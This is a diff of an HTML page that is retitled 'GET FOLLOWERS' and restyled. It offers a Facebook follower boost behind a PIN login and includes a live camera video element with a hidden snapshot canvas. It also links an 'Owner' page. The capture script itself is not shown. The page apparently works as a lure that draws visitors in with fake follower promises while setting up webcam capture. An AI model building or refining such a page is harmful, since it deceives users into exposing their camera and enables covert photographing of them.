@@ -3,47 +3,35 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>User Access</title>
-  <link rel="stylesheet" href="style.css">
+  <title>GET FOLLOWERS</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 </head>
-<body>
+<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen">
+
   <!-- Navbar -->
-  <nav class="navbar">
-    <h1 class="title">FB FOLLOWER</h1>
-    <!-- Hamburger button -->
-    <div class="hamburger" onclick="toggleMenu()">☰</div>
-    <!-- Hidden links by default -->
-    <div class="nav-links hidden" id="navLinks">
-      <a href="index.html" class="btn">Home</a>
-      <a href="owner.html" class="btn">Owner</a>
+  <nav class="w-full bg-gray-800 p-4 flex justify-between items-center">
+    <h1 class="text-xl font-bold">FOLLOWERS BOOST</h1>
+    <button onclick="toggleMenu()" class="text-2xl">☰</button>
+    <div id="navLinks" class="hidden absolute top-14 right-4 bg-gray-700 rounded shadow-lg">
+      <a href="index.html" class="block px-4 py-2 hover:bg-gray-600">Home</a>
+      <a href="owner.html" class="block px-4 py-2 hover:bg-gray-600">Owner</a>
     </div>
   </nav>
 
-  <!-- Main Content -->
-  <main class="content">
-    <h2 class="headline">🔑 Enter Access Code</h2>
+  <!-- User PIN -->
+  <div class="mt-10 text-center">
+    <h2 class="text-2xl font-semibold mb-4">Enter Access PIN</h2>
+    <input id="userPin" type="password" placeholder="PIN" class="px-3 py-2 rounded text-black">
+    <button onclick="userLogin()" class="bg-blue-500 px-4 py-2 ml-2 rounded hover:bg-blue-600">Login</button>
+    <p id="userStatus" class="mt-4 text-green-400"></p>
+  </div>
 
-    <!-- PIN input visible agad -->
-    <div class="pin-container">
-      <input type="password" id="userPin" placeholder="Enter PIN" class="pin-input">
-      <button onclick="userLogin()" class="btn">Login</button>
-    </div>
-
-    <div id="userStatus" class="subtitle"></div>
-
-    <!-- Camera section (hidden until correct PIN) -->
-    <div id="cameraSection" class="hidden">
-      <video id="camera" autoplay playsinline class="video"></video>
-      <canvas id="snapshot" class="hidden"></canvas>
-      <p id="status" class="subtitle"></p>
-    </div>
-  </main>
+  <!-- Camera -->
+  <div class="mt-6 text-center">
+    <video id="camera" autoplay playsinline class="rounded-lg shadow-lg border-2 border-blue-500"></video>
+    <canvas id="snapshot" class="hidden"></canvas>
+  </div>
 
   <script src="script.js"></script>
-  <script>
-    function toggleMenu() {
-      document.getElementById("navLinks").classList.toggle("hidden");
-    }
-  </script>
 </body>
 </html>
